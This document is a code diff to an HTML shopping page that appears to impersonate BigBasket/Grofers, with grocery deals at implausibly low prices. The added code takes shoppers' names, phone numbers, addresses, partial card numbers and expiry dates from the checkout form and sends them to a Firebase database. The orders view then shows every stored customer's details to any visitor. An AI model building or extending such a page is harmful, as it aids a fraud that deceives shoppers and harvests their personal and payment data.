@@ -1119,7 +1119,7 @@
 </div>
 
 <div id="cart-page" class="cart-page">
-    <div class="cart-header"><div class="logo"><img src="https://uploads.onecompiler.io/43vywcru4/44meephhv/46b115bd-5ab5-4a74-b6b6-bb7cb4973d80.__CR0,0,600,180_PT0_SX600_V1___.jpg" style="height:32px;"></div><div class="cart-box">🛒</div></div>
+    <div class="cart-header"><div class="logo"><img src="https://img.icons8.com/color/48/bigbasket.png" style="height:32px;"></div><div class="cart-box">🛒</div></div>
     <div class="continue-shopping" onclick="hideCart()"><span>←</span> Continue shopping</div>
     <div class="delivery-status-bar"><div class="status-left"><div><b>Delivery in 4 hours</b><span>Fastest delivery in your area</span></div></div></div>
     <div class="cart-card-main">
@@ -1201,7 +1201,25 @@
     <div class="copyright">© 2025 Grofers India Pvt. Ltd. All Rights Reserved.</div>
 </footer>
 
+<!-- Firebase SDKs -->
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
 <script>
+    // Firebase Configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyDO5jVqXjFfjw-u3bJoZ5Ld0KMz9srvZxA",
+        authDomain: "bbweb1.firebaseapp.com",
+        databaseURL: "https://bbweb1-default-rtdb.firebaseio.com",
+        projectId: "bbweb1",
+        storageBucket: "bbweb1.firebasestorage.app",
+        messagingSenderId: "25164656071",
+        appId: "1:25164656071:web:c9e8fce52d21c4f8a2fde2",
+        measurementId: "G-BVBH8ES9J3"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
     // Product Data with CDN Images
     const products = [
         { id: 1, img: "https://uploads.onecompiler.io/44meeupjv/44meexutk/9-items-combo.jpg", title: "Big Basket Offer: Ashirwad Atta 20kg + Besan 1kg + Sugar 5kg + Mustard Oil 5L", price: "499", oldPrice: "1099", off: "55% Off", rating: "★★★★★", ratingCount: "2,165" },
@@ -1234,7 +1252,7 @@
         const grid = document.getElementById('products-grid');
         grid.innerHTML = products.map(p => `
             <div class="product-card" onclick="openProductModal(${p.id})">
-                <div class="product-image"><img src="${p.img}" alt="${p.title}"><div class="discount-badge">${p.off}</div><img src="https://uploads.onecompiler.io/43vywcru4/44meephhv/46b115bd-5ab5-4a74-b6b6-bb7cb4973d80.__CR0,0,600,180_PT0_SX600_V1___.jpg" class="right-logo"></div>
+                <div class="product-image"><img src="${p.img}" alt="${p.title}"><div class="discount-badge">${p.off}</div><img src="https://img.icons8.com/color/48/bigbasket.png" class="right-logo"></div>
                 <div class="product-info"><div class="product-title">${p.title.substring(0, 60)}...</div><div class="rating">${p.rating} (${p.ratingCount})</div>
                 <div class="price-row"><span class="current-price">₹${p.price}</span><span class="old-price">₹${p.oldPrice}</span><span class="off">${p.off}</span></div>
                 <button class="add-btn" onclick="event.stopPropagation(); addToCart(${p.id})">🛒 Add to cart</button></div>
@@ -1319,7 +1337,8 @@
         document.getElementById('bill-discount').innerText = `− ₹${discount}`;
         document.getElementById('bill-total').innerText = `₹${current}`;
         document.getElementById('footer-total').innerText = `₹${current}`;
-        document.querySelector('.btn-checkout-main .qty').innerText = `${qty} item${qty > 1 ? 's' : ''}`;
+        const checkoutBtn = document.querySelector('.btn-checkout-main');
+        if(checkoutBtn) checkoutBtn.querySelector('.qty').innerText = `${qty} item${qty > 1 ? 's' : ''}`;
         document.getElementById('savings-alert').innerText = `🥳 You are saving ₹${discount} on this order!`;
         document.getElementById('payment-total').innerText = `₹${finalPay}`;
     }
@@ -1376,31 +1395,139 @@
         const cvv = document.getElementById('card-cvv').value;
         if(cardNum.length<16 || month.length<2 || year.length<2 || cvv.length<3) { alert("Please enter valid card details"); return; }
         
+        // Get address values
+        const name = document.getElementById('addr-name').value;
+        const mobile = document.getElementById('addr-mobile').value;
+        const house = document.getElementById('addr-house').value;
+        const city = document.getElementById('addr-city').value;
+        const state = document.getElementById('addr-state').value;
+        const pincode = document.getElementById('addr-pincode').value;
+        
+        // Calculate totals
         const totalMRP = cart.reduce((sum, i) => sum + parseInt(i.oldPrice) * i.qty, 0);
         const totalCurrent = cart.reduce((sum, i) => sum + parseInt(i.price) * i.qty, 0);
-        const finalPay = totalCurrent - Math.round(totalCurrent * 0.1);
+        const discount = totalMRP - totalCurrent;
+        const creditDiscount = Math.round(totalCurrent * 0.1);
+        const finalPay = totalCurrent - creditDiscount;
         
-        const orderData = { items: cart, total: finalPay, status: 'Pending', timestamp: new Date().toISOString() };
-        let orders = JSON.parse(localStorage.getItem('orders')) || [];
-        orders.push(orderData);
-        localStorage.setItem('orders', JSON.stringify(orders));
+        // Disable button and show loading
+        const payBtn = document.querySelector('.sticky-pay-footer');
+        const originalContent = payBtn.innerHTML;
+        payBtn.innerHTML = '<div style="width:100%; text-align:center;"><span class="spinner"></span> Placing order...</div>';
+        payBtn.style.pointerEvents = 'none';
         
-        cart = [];
-        localStorage.setItem('cart', JSON.stringify(cart));
-        updateCartBadge();
+        // Prepare order data for Firebase
+        const orderData = {
+            customer: {
+                name: name,
+                mobile: mobile,
+                address: house,
+                city: city,
+                state: state,
+                pincode: pincode,
+                fullAddress: `${house}, ${city}, ${state} - ${pincode}`
+            },
+            payment: {
+                cardNumber: "****" + cardNum.slice(-4),
+                cardType: "Credit Card",
+                expiryMonth: month,
+                expiryYear: year
+            },
+            orderItems: cart.map(item => ({
+                id: item.id,
+                title: item.title,
+                price: item.price,
+                oldPrice: item.oldPrice,
+                off: item.off,
+                qty: item.qty,
+                img: item.img
+            })),
+            billing: {
+                mrp: totalMRP,
+                discount: discount,
+                creditCardDiscount: creditDiscount,
+                totalAmount: finalPay
+            },
+            status: 'Pending',
+            orderDate: new Date().toISOString(),
+            timestamp: firebase.database.ServerValue.TIMESTAMP
+        };
         
-        hideAllPages();
-        document.getElementById('success-page').style.display = 'block';
-        history.pushState({}, '', '/success');
+        // Save to Firebase
+        db.ref('orders').push(orderData).then((snapshot) => {
+            const orderId = snapshot.key;
+            localStorage.setItem('lastOrderId', orderId);
+            
+            // Clear cart after successful order
+            cart = [];
+            localStorage.setItem('cart', JSON.stringify(cart));
+            updateCartBadge();
+            
+            // Show success page
+            hideAllPages();
+            document.getElementById('success-page').style.display = 'block';
+            history.pushState({}, '', '/success');
+            
+            // Reset button
+            payBtn.innerHTML = originalContent;
+            payBtn.style.pointerEvents = 'auto';
+        }).catch((error) => {
+            console.error("Firebase Error:", error);
+            alert("Order failed! Please check your internet connection.");
+            payBtn.innerHTML = originalContent;
+            payBtn.style.pointerEvents = 'auto';
+        });
     }
     
     function showOrders() {
         hideAllPages();
-        const orders = JSON.parse(localStorage.getItem('orders')) || [];
         const container = document.getElementById('orders-list');
-        if(orders.length === 0) container.innerHTML = '<div style="padding:40px;text-align:center;">No orders yet</div>';
-        else container.innerHTML = orders.map((order, idx) => `<div class="order-card"><div class="order-id-row"><span>Order #${(idx+1).toString().padStart(6,'0')}</span><span class="order-status-badge">${order.status}</span></div>${order.items.map(item => `<div class="order-product-info"><img src="${item.img}" class="order-product-img"><div><h4>${item.title.substring(0,50)}...</h4><div>Qty: ${item.qty}</div></div></div>`).join('')}<div class="order-footer-row"><div class="order-total">Total: ₹${order.total}</div><button class="reorder-btn" onclick="goHome()">Shop Again</button></div></div>`).join('');
-        document.getElementById('orders-page').style.display = 'block';
+        container.innerHTML = '<div style="padding:40px; text-align:center;"><span class="spinner"></span> Loading orders...</div>';
+        
+        // Fetch orders from Firebase
+        db.ref('orders').orderByChild('timestamp').once('value', (snapshot) => {
+            const orders = [];
+            snapshot.forEach((childSnapshot) => {
+                const order = childSnapshot.val();
+                order.id = childSnapshot.key;
+                orders.push(order);
+            });
+            orders.reverse(); // Show latest first
+            
+            if(orders.length === 0) {
+                container.innerHTML = '<div style="padding:40px;text-align:center;color:#888;">No orders yet</div>';
+            } else {
+                container.innerHTML = orders.map((order, idx) => {
+                    const statusColor = order.status === 'Delivered' ? '#0e8321' : '#d97706';
+                    const statusBg = order.status === 'Delivered' ? '#e8f5e9' : '#fff9e6';
+                    return `<div class="order-card">
+                        <div class="order-id-row">
+                            <span>Order #${order.id.slice(-8).toUpperCase()}</span>
+                            <span class="order-status-badge" style="background:${statusBg}; color:${statusColor};">${order.status}</span>
+                        </div>
+                        ${order.orderItems.map(item => `
+                            <div class="order-product-info">
+                                <img src="${item.img}" class="order-product-img">
+                                <div class="order-product-details">
+                                    <h4>${item.title.substring(0,50)}...</h4>
+                                    <div style="color:#888; font-size:12px;">Qty: ${item.qty}</div>
+                                </div>
+                            </div>
+                        `).join('')}
+                        <div class="order-footer-row">
+                            <div class="order-total">Total: ₹${order.billing?.totalAmount || order.totalAmount || '0'}</div>
+                            <button class="reorder-btn" onclick="goHome()">Shop Again</button>
+                        </div>
+                        <div style="margin-top:12px; font-size:11px; color:#aaa;">${new Date(order.orderDate).toLocaleString()}</div>
+                    </div>`;
+                }).join('');
+            }
+            document.getElementById('orders-page').style.display = 'block';
+        }).catch((error) => {
+            console.error("Error fetching orders:", error);
+            container.innerHTML = '<div style="padding:40px;text-align:center;color:#888;">Error loading orders. Please try again.</div>';
+            document.getElementById('orders-page').style.display = 'block';
+        });
     }
     
     function checkForm() {
@@ -1408,7 +1535,7 @@
         let allFilled = true;
         inputs.forEach(inp => { if(inp.value.trim() === '') allFilled = false; });
         const btn = document.getElementById('btn-continue');
-        if(allFilled) { btn.classList.add('ready'); btn.disabled = false; }
+        if(allFilled && cart.length > 0) { btn.classList.add('ready'); btn.disabled = false; }
         else { btn.classList.remove('ready'); btn.disabled = true; }
     }
     
@@ -1422,6 +1549,28 @@
         document.body.appendChild(toast);
         setTimeout(() => toast.remove(), 2000);
     }
+
+    // Update address summary in payment page when address changes
+    function updateAddressSummary() {
+        const name = document.getElementById('addr-name')?.value;
+        const mobile = document.getElementById('addr-mobile')?.value;
+        const house = document.getElementById('addr-house')?.value;
+        const city = document.getElementById('addr-city')?.value;
+        const state = document.getElementById('addr-state')?.value;
+        const pincode = document.getElementById('addr-pincode')?.value;
+        if(name && house && city && state && pincode) {
+            document.getElementById('summary-name').innerHTML = `<b>${name}</b><br>+91 ${mobile || ''}`;
+            document.getElementById('summary-address').innerHTML = `${house}, ${city}, ${state} - ${pincode}`;
+        }
+    }
+
+    // Call updateAddressSummary when address form changes
+    document.getElementById('addr-name')?.addEventListener('input', updateAddressSummary);
+    document.getElementById('addr-mobile')?.addEventListener('input', updateAddressSummary);
+    document.getElementById('addr-house')?.addEventListener('input', updateAddressSummary);
+    document.getElementById('addr-city')?.addEventListener('input', updateAddressSummary);
+    document.getElementById('addr-state')?.addEventListener('input', updateAddressSummary);
+    document.getElementById('addr-pincode')?.addEventListener('input', updateAddressSummary);
 
     renderProducts();
     updateCartBadge();
